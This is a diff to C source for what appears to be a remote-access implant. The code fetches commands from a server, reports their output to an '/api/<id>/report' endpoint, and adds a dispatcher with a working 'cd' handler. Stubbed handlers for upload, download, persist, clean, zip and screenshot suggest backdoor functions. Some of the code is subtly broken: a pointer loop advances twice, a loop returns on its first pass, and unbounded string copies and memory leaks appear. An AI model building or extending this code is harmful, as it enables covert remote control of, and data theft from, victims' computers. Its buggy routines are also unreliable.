@@ -31,11 +31,24 @@ long TIME_LAST_ACTIVE;
 * ------------------------------------------------------------------------ */
 char* get_command(char* todo)
 {
-    char *token = strtok(todo, " ");
+    char *todo_temp = malloc(BUFFER_SIZE);
+    strcpy(todo_temp,todo);
+    char *token = strtok(todo_temp, " ");
     while (token != NULL)
     {
 				return token;
     }
+    return todo_temp;
+}
+
+char* get_args(char* todo)
+{
+		char *args;
+		for (args = todo; *args && *args != ' ' ;args++)
+    {
+				if (*args) args++;
+    }
+		return args;
 }
 
 int get_args_len(char* todo)
@@ -45,6 +58,7 @@ int get_args_len(char* todo)
     while (token != NULL)
     {
 				count++;
+        token = strtok(NULL, " ");
     }
 		return count - 1;
 }
@@ -103,7 +117,6 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     size_t n = (size * nmemb);
     char* tmp;
     data->size += (size * nmemb);
-    fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
     tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
     if(tmp){
         data->data = tmp;
@@ -192,12 +205,18 @@ char* post_request(char *path, char *post_data, bool json)
 * ------------------------------------------------------------------------ */
 char* send_output(char* output, bool newlines)
 {
+    char *output_temp = malloc(BUFFER_SIZE);
     if(output!= NULL && output[0] == '\0') return "";
-    if(newlines) strcat(output,"\n\n");
+    if(newlines)
+    {
+        strcpy(output_temp,output);
+        strcat(output_temp,"\n\n");
+    }
+    else strcpy(output_temp,output);
     char *path = malloc(BUFFER_SIZE);
     char *post_data = malloc(BUFFER_SIZE);
     sprintf(path, "/api/%s/report", get_unique_id());
-    sprintf(post_data,"output=%s",output);
+    sprintf(post_data,"output=%s",output_temp);
     return post_request(path, post_data, false);
 
 }
@@ -257,7 +276,47 @@ void run()
             send_output(output, true);
             char *command = get_command(todo);
             int args_len = get_args_len(todo);
+            if(strcmp("cd",command) == 0)
+            {
+                if(args_len == 0)
+                    send_output("Usage: cd </path/to/directory>",true);
+                else
+                    chdir(get_args(todo));
+            }
+/*
+            else if(strcmp("upload",command) == 0)
+            {
 
+            }
+            else if(strcmp("download",command) == 0)
+            {
+
+            }
+            else if(strcmp("clean",command) == 0)
+            {
+
+            }
+            else if(strcmp("persist",command) == 0)
+            {
+
+            }
+            else if(strcmp("exit",command) == 0)
+            {
+
+            }
+            else if(strcmp("zip",command) == 0)
+            {
+
+            }
+            else if(strcmp("screenshot",command) == 0)
+            {
+
+            }
+            else
+            {
+
+            }
+*/
         }
         else
         {
